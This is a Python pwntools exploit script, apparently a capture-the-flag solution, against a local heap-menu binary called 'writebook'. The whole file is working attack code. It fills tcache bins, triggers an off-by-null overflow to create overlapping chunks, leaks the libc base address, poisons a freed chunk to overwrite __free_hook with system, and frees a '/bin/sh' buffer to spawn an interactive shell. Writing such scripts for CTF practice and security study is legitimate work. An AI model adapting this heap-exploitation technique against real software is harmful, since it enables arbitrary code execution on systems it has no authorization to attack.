#!/usr/bin/env python
from pwn import *

#context.log_level = 'debug'
context.terminal = ['tmux', 'split', '-h']

local = 1
if local:
    p = process('./writebook')
    elf = ELF('./writebook')
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
else:
    pass

def choice(c):
    p.sendlineafter('> ', str(c))

def add(c, sz):
    choice(1)
    p.sendlineafter('> ', str(c))
    p.sendlineafter('size: ', str(sz))

def edit(idx, data):
    choice(2)
    p.sendlineafter('Page: ', str(idx))
    p.sendafter('Content: ', data)

def show(idx):
    choice(3)
    p.sendlineafter('Page: ', str(idx))

def delete(idx):
    choice(4)
    p.sendlineafter('Page: ', str(idx))

# leak libc
for i in range(7):
    add(1, 0xf0)
for i in range(8):
    add(2, 0x118)
add(1, 0x68) # 15
add(1, 0xf0) # 16
add(1, 0xf0) # 17
for i in range(15):
    delete(i)
edit(15, 0x60 * '\x00' + p64(0x190)) # off by null
delete(16)
add(2, 0x138) # 0
show(0)
p.recvuntil('Content: ')
libc_base = u64(p.recv(6).ljust(8, '\x00')) - 0x3ebf20
info('libc_base = ' + hex(libc_base))

# get shell
free_hook = libc_base + libc.sym['__free_hook']
system = libc_base + libc.sym['system']
delete(15) # chunk overlap
edit(0, '/bin/sh\x00'.ljust(0x120, '\x00') + p64(free_hook) + '\n')
add(1, 0x68) # 1
add(1, 0x68) # 2
edit(2, p64(system) + '\n')
delete(0)

#gdb.attach(p)

p.interactive()

